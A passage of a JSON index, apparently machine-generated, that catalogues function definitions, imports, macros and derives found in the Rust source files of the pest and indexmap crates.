          "token => panic!(\"{} but found {:?}\", expected, token)",
          "consumes_to!($rules, $tokens, [ $( $names $calls ),* ]);",
          "let expected = format!(\"expected End {{ rule: {:?}, pos: Position {{ pos: {} }} ",
          "match $tokens.next().expect(&format!(\"{} but found nothing\", expected)) {",
          "assert!(rule == $rules::$name && pos.pos() == $end,",
          "token => panic!(\"{} but found {:?}\", expected, token)",
          "let expected = format!(\"expected Start {{ rule: {:?}, pos: Position {{ pos: {} }",
          "match $tokens.next().expect(&format!(\"{} but found nothing\", expected)) {",
          "assert!(rule == $rules::$name && pos.pos() == $start,",
          "token => panic!(\"{} but found {:?}\", expected, token)",
          "consumes_to!($rules, $tokens, [ $( $nested_names $nested_calls ),* ]);",
          "let expected = format!(\"expected End {{ rule: {:?}, pos: Position {{ pos: {} }} ",
          "match $tokens.next().expect(&format!(\"{} but found nothing\", expected)) {",
          "assert!(rule == $rules::$name && pos.pos() == $end,",
          "token => panic!(\"{} but found {:?}\", expected, token)",
          "consumes_to!($rules, $tokens, [ $( $names $calls ),* ]);",
          "consumes_to!($rules, &mut tokens, [ $( $names $calls ),* ]);",
          "assert!(",
          "format!(\"{:?}\", first_rule) == \"EOI\",",
          "assert!(",
          "format!(\"{:?}\", second_rule) == \"EOI\",",
          "_ => panic!(\"expected end of input, but found {:?}\", rest)",
          "_ => panic!(\"expected end of input, but found {:?}\", rest)",
          "assert_eq!(positives, $positives, \"positives\");",
          "assert_eq!(negatives, $negatives, \"negatives\");",
          "_ => unreachable!(),",
          "$crate::error::InputLocation::Pos(pos) => assert_eq!(pos, $pos, \"pos\"),",
          "_ => unreachable!(),"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]"
        ],
        "error_handling": 52
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/parser.rs",
        "function_defs": [
          "fn parse(rule: R, input: &str) -> Result<Pairs<'_, R>, Error<R>>;"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::error::Error;",
          "use crate::iterators::Pairs;",
          "use crate::RuleType;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/unicode/binary.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/unicode/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use alloc::boxed::Box;"
        ],
        "macros": [
          "$(stringify!($prop),)*",
          "property_functions!($module, $property_names, [$(",
          "property_functions!($module, $property_names, [$("
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/unicode/category.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/unicode/script.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/iterators/tokens.rs",
        "function_defs": [
          "fn create_token(&self, index: usize) -> Token<'i, R> {",
          "fn len(&self) -> usize {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn double_ended_iter_for_tokens() {",
          "fn exact_size_iter_for_tokens() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use alloc::rc::Rc;",
          "use alloc::vec::Vec;",
          "use core::fmt;",
          "use core::str;",
          "use super::queueable_token::QueueableToken;",
          "use crate::position;",
          "use crate::token::Token;",
          "use crate::RuleType;",
          "use super::super::super::macros::tests::*;",
          "use super::super::super::Parser;",
          "use super::Token;",
          "use alloc::vec::Vec;"
        ],
        "macros": [
          "if cfg!(debug_assertions) {",
          "assert!(",
          "_ => unreachable!(),",
          "assert_eq!(tokens, reverse_tokens);",
          "assert_eq!(tokens.len(), tokens.count());",
          "assert_eq!(tokens.len(), tokens.count());",
          "assert_eq!(tokens.len(), tokens.count());",
          "assert_eq!(tokens.count() + 1, tokens_len);"
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/iterators/pairs.rs",
        "function_defs": [
          "fn pair(&self) -> usize {",
          "fn pair_from_end(&self) -> usize {",
          "fn pos(&self, index: usize) -> usize {",
          "fn len(&self) -> usize {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn eq(&self, other: &Pairs<'i, R>) -> bool {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn test_pretty_print() {",
          "fn as_str() {",
          "fn get_input_of_pairs() {",
          "fn as_str_empty() {",
          "fn concat() {",
          "fn pairs_debug() {",
          "fn pairs_display() {",
          "fn iter_for_pairs() {",
          "fn double_ended_iter_for_pairs() {",
          "fn test_line_col() {",
          "fn test_rev_iter_line_col() {",
          "fn test_tag_node_branch() {",
          "fn mark_branch(",
          "fn expr<'a>(",
          "fn number(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn exact_size_iter_for_pairs() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use alloc::format;",
          "use alloc::rc::Rc;",
          "use alloc::string::String;",
          "use alloc::vec::Vec;",
          "use core::fmt;",
          "use core::hash::{Hash, Hasher};",
          "use core::iter::Filter;",
          "use core::ptr;",
          "use core::str;",
          "use serde::ser::SerializeStruct;",
          "use super::flat_pairs::{self, FlatPairs};",
          "use super::line_index::LineIndex;",
          "use super::pair::{self, Pair};",
          "use super::queueable_token::QueueableToken;",
          "use super::tokens::{self, Tokens};",
          "use crate::RuleType;",
          "use super::super::super::macros::tests::*;",
          "use super::super::super::Parser;",
          "use alloc::borrow::ToOwned;",
          "use alloc::boxed::Box;",
          "use alloc::format;",
          "use alloc::vec;",
          "use alloc::vec::Vec;",
          "use crate::{state, ParseResult, ParserState};"
        ],
        "macros": [
          "_ => unreachable!(),",
          "/// assert_eq!(pairs.as_str(), \"a b\");",
          "/// assert_eq!(pairs.as_str(), \"a b\");",
          "/// assert_eq!(input, pairs.get_input());",
          "/// assert_eq!(pairs.concat(), \"ab\");",
          "/// assert_eq!(tokens.len(), 4);",
          "/// assert_eq!(pairs.find_first_tagged(\"add\").unwrap().as_rule(), Rule::add);",
          "/// assert_eq!(pairs.find_first_tagged(\"mul\"), None);",
          "/// assert_eq!(left_numbers.next().unwrap().as_str(), \"1\");",
          "/// assert_eq!(left_numbers.next(), None);",
          ".filter(move |pair: &Pair<'i, R>| matches!(pair.as_node_tag(), Some(nt) if nt ==",
          "/// assert_eq!(tokens.len(), 2);",
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "write!(",
          ".map(|pair| format!(\"{}\", pair))",
          "assert_eq!(expected, pairs.to_json());",
          "assert_eq!(pairs.as_str(), \"abcde\");",
          "assert_eq!(pairs.get_input(), input);",
          "assert_eq!(pairs.nth(1).unwrap().into_inner().as_str(), \"\");",
          "assert_eq!(pairs.concat(), \"abce\");",
          "assert_eq!(",
          "format!(\"{:?}\", pairs),",
          "assert_eq!(",
          "format!(\"{}\", pairs),",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(pair.as_str(), \"abc\");",
          "assert_eq!(pair.line_col(), (1, 1));",
          "assert_eq!(pair.as_str(), \"e\");",
          "assert_eq!(pair.line_col(), (2, 1));",
          "assert_eq!(pair.as_str(), \"fgh\");",
          "assert_eq!(pair.line_col(), (2, 2));",
          "assert_eq!(pair.as_str(), \"fgh\");",
          "assert_eq!(pair.line_col(), (2, 2));",
          "assert_eq!(pair.as_str(), \"e\");",
          "assert_eq!(pair.line_col(), (2, 1));",
          "assert_eq!(pair.as_str(), \"abc\");",
          "assert_eq!(pair.line_col(), (1, 1));",
          "assert_eq!(pairs.find_first_tagged(\"add\").unwrap().as_rule(), Rule::add);",
          "assert_eq!(pairs.find_first_tagged(\"mul\"), None);",
          "assert_eq!(left_numbers.next().unwrap().as_str(), \"1\");",
          "assert_eq!(left_numbers.next(), None);",
          "assert_eq!(right_numbers.next().unwrap().as_str(), \"2\");",
          "assert_eq!(right_numbers.next(), None);",
          "assert_eq!(pairs.len(), pairs.count());",
          "assert_eq!(pairs.len(), pairs.count());",
          "assert_eq!(pairs.count() + 1, pairs_len);"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone, Copy, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]"
        ],
        "error_handling": 46
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/iterators/queueable_token.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/iterators/pair.rs",
        "function_defs": [
          "fn pair(&self) -> usize {",
          "fn pos(&self, index: usize) -> usize {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn eq(&self, other: &Pair<'i, R>) -> bool {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn test_pretty_print() {",
          "fn pair_into_inner() {",
          "fn get_input_of_pair() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use alloc::format;",
          "use alloc::rc::Rc;",
          "use alloc::string::String;",
          "use alloc::vec::Vec;",
          "use core::borrow::Borrow;",
          "use core::fmt;",
          "use core::hash::{Hash, Hasher};",
          "use core::ptr;",
          "use core::str;",
          "use serde::ser::SerializeStruct;",
          "use super::line_index::LineIndex;",
          "use super::pairs::{self, Pairs};",
          "use super::queueable_token::QueueableToken;",
          "use super::tokens::{self, Tokens};",
          "use crate::span::Span;",
          "use crate::RuleType;",
          "use crate::macros::tests::*;",
          "use crate::parser::Parser;"
        ],
        "macros": [
          "/// assert_eq!(pair.as_rule(), Rule::a);",
          "_ => unreachable!(),",
          "/// assert_eq!(pair.as_str(), \"ab\");",
          "/// assert_eq!(pair.as_str(), \"ab\");",
          "/// assert_eq!(input, pair.get_input());",
          "/// assert_eq!(pair.into_span().as_str(), \"ab\");",
          "/// assert_eq!(pair.as_span().as_str(), \"ab\");",
          "/// assert!(pair.into_inner().next().is_none());",
          "/// assert_eq!(tokens.len(), 2);",
          "_ => unreachable!(),",
          "write!(f, \"{:?}({}, {})\", rule, start, end)",
          "write!(",
          ".map(|pair| format!(\"{}\", pair))",
          "let rule = format!(\"{:?}\", self.as_rule());",
          "assert_eq!(expected, pair.to_json());",
          "assert_eq!(2, pairs.tokens().count());",
          "assert_eq!(input, pair.get_input());"
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 22
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/iterators/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/iterators/line_index.rs",
        "function_defs": [
          "fn test_line_index() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl LineIndex {"
        ],
        "uses": [
          "use alloc::vec::Vec;",
          "use super::*;"
        ],
        "macros": [
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/src/iterators/flat_pairs.rs",
        "function_defs": [
          "fn next_start(&mut self) {",
          "fn next_start_from_end(&mut self) {",
          "fn is_start(&self, index: usize) -> bool {",
          "fn len(&self) -> usize {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn clone(&self) -> FlatPairs<'i, R> {",
          "fn iter_for_flat_pairs() {",
          "fn double_ended_iter_for_flat_pairs() {",
          "fn test_line_col() {",
          "fn exact_size_iter_for_pairs() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use alloc::rc::Rc;",
          "use alloc::vec::Vec;",
          "use core::fmt;",
          "use super::line_index::LineIndex;",
          "use super::pair::{self, Pair};",
          "use super::queueable_token::QueueableToken;",
          "use super::tokens::{self, Tokens};",
          "use crate::RuleType;",
          "use super::super::super::macros::tests::*;",
          "use super::super::super::Parser;",
          "use alloc::vec;",
          "use alloc::vec::Vec;"
        ],
        "macros": [
          "/// assert_eq!(tokens.len(), 2);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(pair.as_str(), \"abc\");",
          "assert_eq!(pair.line_col(), (1, 1));",
          "assert_eq!(pair.line_col(), pair.as_span().start_pos().line_col());",
          "assert_eq!(pair.as_str(), \"b\");",
          "assert_eq!(pair.line_col(), (1, 2));",
          "assert_eq!(pair.line_col(), pair.as_span().start_pos().line_col());",
          "assert_eq!(pair.as_str(), \"e\");",
          "assert_eq!(pair.line_col(), (1, 5));",
          "assert_eq!(pair.line_col(), pair.as_span().start_pos().line_col());",
          "assert_eq!(pairs.len(), pairs.count());",
          "assert_eq!(pairs.len(), pairs.count());",
          "assert_eq!(pairs.len(), pairs.count());",
          "assert_eq!(pairs.count() + 1, pairs_len);"
        ],
        "derives": [],
        "error_handling": 13
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3",
    "name": "indexmap-1.9.3",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/build.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/tests/quick.rs",
        "function_defs": [
          "fn set<'a, T: 'a, I>(iter: I) -> HashSet<T>",
          "fn indexmap<'a, T: 'a, I>(iter: I) -> IndexMap<T, ()>",
          "fn $fn_name:ident($($arg_name:ident : $arg_ty:ty),*) -> $ret:ty {",
          "fn $fn_name() {",
          "fn prop($($arg_name: $arg_ty),*) -> $ret {",
          "fn contains(insert: Vec<u32>) -> bool {",
          "fn contains_not(insert: Vec<u8>, not: Vec<u8>) -> bool {",
          "fn insert_remove(insert: Vec<u8>, remove: Vec<u8>) -> bool {",
          "fn insertion_order(insert: Vec<u32>) -> bool {",
          "fn pop(insert: Vec<u8>) -> bool {",
          "fn with_cap(template: Vec<()>) -> bool {",
          "fn drain_full(insert: Vec<u8>) -> bool {",
          "fn drain_bounds(insert: Vec<u8>, range: (Bound<usize>, Bound<usize>)) -> TestResult {",
          "fn shift_remove(insert: Vec<u8>, remove: Vec<u8>) -> bool {",
          "fn indexing(insert: Vec<u8>) -> bool {",
          "fn swap_indices(vec: Vec<u8>, a: u8, b: u8) -> TestResult {",
          "fn move_index(vec: Vec<u8>, from: u8, to: u8) -> TestResult {",
          "fn arbitrary(g: &mut Gen) -> Self {",
          "fn do_ops<K, V, S>(ops: &[Op<K, V>], a: &mut IndexMap<K, V, S>, b: &mut HashMap<K, V>)",
          "fn assert_maps_equivalent<K, V>(a: &IndexMap<K, V>, b: &HashMap<K, V>) -> bool",
          "fn operations_i8(ops: Large<Vec<Op<i8, i8>>>) -> bool {",
          "fn operations_string(ops: Vec<Op<Alpha, i8>>) -> bool {",
          "fn keys_values(ops: Large<Vec<Op<i8, i8>>>) -> bool {",
          "fn keys_values_mut(ops: Large<Vec<Op<i8, i8>>>) -> bool {",
          "fn equality(ops1: Vec<Op<i8, i8>>, removes: Vec<usize>) -> bool {",
          "fn retain_ordered(keys: Large<Vec<i8>>, remove: Large<Vec<i8>>) -> () {",
          "fn sort_1(keyvals: Large<Vec<(i8, i8)>>) -> () {",
          "fn sort_2(keyvals: Large<Vec<(i8, i8)>>) -> () {",
          "fn reverse(keyvals: Large<Vec<(i8, i8)>>) -> () {",
          "fn generate_answer(input: &Vec<(i8, i8)>) -> Vec<(i8, i8)> {",
          "fn assert_sorted_by_key<I, Key, X>(iterable: I, key: Key)",
          "fn deref(&self) -> &String {",
          "fn arbitrary(g: &mut Gen) -> Self {",
          "fn shrink(&self) -> Box<dyn Iterator<Item = Self>> {",
          "fn deref(&self) -> &T {",
          "fn arbitrary(g: &mut Gen) -> Self {",
          "fn shrink(&self) -> Box<dyn Iterator<Item = Self>> {"
        ],
        "struct_defs": [
          "struct Alpha(String);",
          "struct Large<T>(T);"
        ],
        "impl_blocks": [
          "impl Deref for Alpha {",
          "impl Arbitrary for Alpha {"
        ],
        "uses": [
          "use indexmap::{IndexMap, IndexSet};",
          "use itertools::Itertools;",
          "use quickcheck::Arbitrary;",
          "use quickcheck::Gen;",
          "use quickcheck::QuickCheck;",
          "use quickcheck::TestResult;",
          "use fnv::FnvHasher;",
          "use std::hash::{BuildHasher, BuildHasherDefault};",
          "use std::cmp::min;",
          "use std::collections::HashMap;",
          "use std::collections::HashSet;",
          "use std::fmt::Debug;",
          "use std::hash::Hash;",
          "use std::ops::Bound;",
          "use std::ops::Deref;",
          "use indexmap::map::Entry as OEntry;",
          "use std::collections::hash_map::Entry as HEntry;",
          "use crate::Op::*;"
        ],
        "macros": [
          "if cfg!(miri) {",
          "println!(\"wish: {}, got: {} (diff: {})\", cap, map.capacity(), map.capacity() as ",
          "assert!(map.keys().eq(&keys));",
          "assert!(keys.iter().all(|key| map.contains_key(key)));",
          "assert_eq!(Some(&key), iter.next());",
          "assert_eq!(map.len(), set.len());",
          "assert_eq!(map.get_index(i), Some((&key, &key)));",
          "assert_eq!(set.get_index(i), Some(&key));",
          "assert_eq!(map[i], key);",
          "assert_eq!(set[i], key);",
          "assert!(set.iter().eq(vec.iter()));",
          "assert!(vec.iter().enumerate().all(|(i, x)| {",
          "assert!(set.iter().eq(vec.iter()));",
          "assert!(vec.iter().enumerate().all(|(i, x)| {",
          "//println!(\"{:?}\", a);",
          "assert_eq!(a.len(), b.len());",
          "assert_eq!(a.iter().next().is_some(), b.iter().next().is_some());",
          "assert!(b.contains_key(key), \"b does not contain {:?}\", key);",
          "assert!(a.get(key).is_some(), \"a does not contain {:?}\", key);",
          "assert_eq!(a[key], b[key]);",
          "assert_eq!(&map[k], v);",
          "assert!(!visit.contains_key(k));",
          "assert_eq!(visit.len(), reference.len());",
          "assert_eq!(&reference[k], v);",
          "assert!(!visit.contains_key(k));",
          "assert_eq!(visit.len(), reference.len());",
          "assert_eq!(map == map2, reference == reference2);",
          "assert_eq!(map.len(), answer.len());",
          "assert!(map.contains_key(key));",
          "assert_eq!(map[&key], val);",
          "assert_eq!(answer, mapv);",
          "assert_eq!(map[&key], val);",
          "assert_eq!(answer, mapv);",
          "assert_eq!(input, sorted);"
        ],
        "derives": [
          "#[derive(Copy, Clone, Debug)]",
          "#[derive(Clone, Debug, Hash, PartialEq, Eq)]",
          "#[derive(Clone, Debug)]"
        ],
        "error_handling": 8
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/tests/macros_full_path.rs",
        "function_defs": [
          "fn test_create_map() {",
          "fn test_create_set() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/tests/equivalent_trait.rs",
        "function_defs": [
          "fn eq(&self, rhs: &(A, B)) -> bool {",
          "fn equivalent(&self, other: &X) -> bool {",
          "fn test_lookup() {",
          "fn test_string_str() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use indexmap::indexmap;",
          "use indexmap::Equivalent;",
          "use std::hash::Hash;"
        ],
        "macros": [
          "assert!(map.contains_key(&Pair(\"a\", \"b\")));",
          "assert!(!map.contains_key(&Pair(\"b\", \"a\")));",
          "assert!(map.contains_key(\"a\"));",
          "assert!(!map.contains_key(\"z\"));",
          "assert_eq!(map.swap_remove(\"b\"), Some(2));"
        ],
        "derives": [
          "#[derive(Debug, Hash)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/tests/tests.rs",
        "function_defs": [
          "fn test_sort() {",
          "fn test_sort_set() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use indexmap::{indexmap, indexset};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/benches/faststring.rs",
        "function_defs": [
          "fn small_rng() -> SmallRng {",
          "fn hash<H: Hasher>(&self, h: &mut H) {",
          "fn from(s: &'a S) -> Self {",
          "fn hash<H: Hasher>(&self, h: &mut H) {",
          "fn borrow(&self) -> &OneShot<str> {",
          "fn deref(&self) -> &T {",
          "fn shuffled_keys<I>(iter: I) -> Vec<I::Item>",
          "fn insert_hashmap_string_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_string_oneshot_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_string_10_000(b: &mut Bencher) {",
          "fn lookup_hashmap_10_000_exist_string(b: &mut Bencher) {",
          "fn lookup_hashmap_10_000_exist_string_oneshot(b: &mut Bencher) {",
          "fn lookup_indexmap_10_000_exist_string(b: &mut Bencher) {",
          "fn lookup_indexmap_10_000_exist_string_oneshot(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Hash for OneShot<str> {",
          "impl Hash for OneShot<String> {",
          "impl Borrow<OneShot<str>> for OneShot<String> {"
        ],
        "uses": [
          "use test::Bencher;",
          "use indexmap::IndexMap;",
          "use std::collections::HashMap;",
          "use rand::rngs::SmallRng;",
          "use rand::seq::SliceRandom;",
          "use rand::SeedableRng;",
          "use std::hash::{Hash, Hasher};",
          "use std::borrow::Borrow;",
          "use std::ops::Deref;"
        ],
        "macros": [],
        "derives": [
          "#[derive(PartialEq, Eq, Copy, Clone)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/benches/bench.rs",
        "function_defs": [
          "fn small_rng() -> SmallRng {",
          "fn new_hashmap(b: &mut Bencher) {",
          "fn new_indexmap(b: &mut Bencher) {",
          "fn with_capacity_10e5_hashmap(b: &mut Bencher) {",
          "fn with_capacity_10e5_indexmap(b: &mut Bencher) {",
          "fn insert_hashmap_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_string_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_string_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_str_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_str_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_int_bigvalue_10_000(b: &mut Bencher) {",
          "fn insert_indexmap_int_bigvalue_10_000(b: &mut Bencher) {",
          "fn insert_hashmap_100_000(b: &mut Bencher) {",
          "fn insert_indexmap_100_000(b: &mut Bencher) {",
          "fn insert_hashmap_150(b: &mut Bencher) {",
          "fn insert_indexmap_150(b: &mut Bencher) {",
          "fn entry_hashmap_150(b: &mut Bencher) {",
          "fn entry_indexmap_150(b: &mut Bencher) {",
          "fn iter_sum_hashmap_10_000(b: &mut Bencher) {",
          "fn iter_sum_indexmap_10_000(b: &mut Bencher) {",
          "fn iter_black_box_hashmap_10_000(b: &mut Bencher) {",
          "fn iter_black_box_indexmap_10_000(b: &mut Bencher) {",
          "fn shuffled_keys<I>(iter: I) -> Vec<I::Item>",
          "fn lookup_hashmap_10_000_exist(b: &mut Bencher) {",
          "fn lookup_hashmap_10_000_noexist(b: &mut Bencher) {",
          "fn lookup_indexmap_10_000_exist(b: &mut Bencher) {",
          "fn lookup_indexmap_10_000_noexist(b: &mut Bencher) {",
          "fn lookup_hashmap_100_000_multi(b: &mut Bencher) {",
          "fn lookup_indexmap_100_000_multi(b: &mut Bencher) {",
          "fn lookup_hashmap_100_000_inorder_multi(b: &mut Bencher) {",
          "fn lookup_indexmap_100_000_inorder_multi(b: &mut Bencher) {",
          "fn lookup_hashmap_100_000_single(b: &mut Bencher) {",
          "fn lookup_indexmap_100_000_single(b: &mut Bencher) {",
          "fn grow_fnv_hashmap_100_000(b: &mut Bencher) {",
          "fn grow_fnv_indexmap_100_000(b: &mut Bencher) {",
          "fn hashmap_merge_simple(b: &mut Bencher) {",
          "fn hashmap_merge_shuffle(b: &mut Bencher) {",
          "fn indexmap_merge_simple(b: &mut Bencher) {",
          "fn indexmap_merge_shuffle(b: &mut Bencher) {",
          "fn swap_remove_indexmap_100_000(b: &mut Bencher) {",
          "fn shift_remove_indexmap_100_000_few(b: &mut Bencher) {",
          "fn shift_remove_indexmap_2_000_full(b: &mut Bencher) {",
          "fn pop_indexmap_100_000(b: &mut Bencher) {",
          "fn few_retain_indexmap_100_000(b: &mut Bencher) {",
          "fn few_retain_hashmap_100_000(b: &mut Bencher) {",
          "fn half_retain_indexmap_100_000(b: &mut Bencher) {",
          "fn half_retain_hashmap_100_000(b: &mut Bencher) {",
          "fn many_retain_indexmap_100_000(b: &mut Bencher) {",
          "fn many_retain_hashmap_100_000(b: &mut Bencher) {",
          "fn indexmap_sort_s(b: &mut Bencher) {",
          "fn indexmap_simple_sort_s(b: &mut Bencher) {",
          "fn indexmap_sort_u32(b: &mut Bencher) {",
          "fn indexmap_simple_sort_u32(b: &mut Bencher) {",
          "fn indexmap_clone_for_sort_s(b: &mut Bencher) {",
          "fn indexmap_clone_for_sort_u32(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use fnv::FnvHasher;",
          "use std::hash::BuildHasherDefault;",
          "use std::hash::Hash;",
          "use test::black_box;",
          "use test::Bencher;",
          "use indexmap::IndexMap;",
          "use std::collections::HashMap;",
          "use rand::rngs::SmallRng;",
          "use rand::seq::SliceRandom;",
          "use rand::SeedableRng;"
        ],
        "macros": [
          "assert_eq!(map.len(), len);",
          "assert_eq!(map.len(), len);",
          "assert_eq!(map.len(), len);",
          "assert_eq!(map.len(), len);",
          "map.insert(format!(\"{:^16x}\", &key), String::new());",
          "assert_eq!(map.len(), 0);",
          "assert_eq!(map.len(), IMAP_100K.len() - keys.len());",
          "assert_eq!(map.len(), 0);",
          "assert_eq!(map.len(), 0);"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/equivalent.rs",
        "function_defs": [
          "fn equivalent(&self, key: &K) -> bool;",
          "fn equivalent(&self, key: &K) -> bool {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::borrow::Borrow;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/arbitrary.rs",
        "function_defs": [
          "fn arbitrary(u: &mut Unstructured<'a>) -> Result<Self> {",
          "fn arbitrary_take_rest(u: Unstructured<'a>) -> Result<Self> {",
          "fn arbitrary(u: &mut Unstructured<'a>) -> Result<Self> {",
          "fn arbitrary_take_rest(u: Unstructured<'a>) -> Result<Self> {",
          "fn arbitrary(g: &mut Gen) -> Self {",
          "fn shrink(&self) -> Box<dyn Iterator<Item = Self>> {",
          "fn arbitrary(g: &mut Gen) -> Self {",
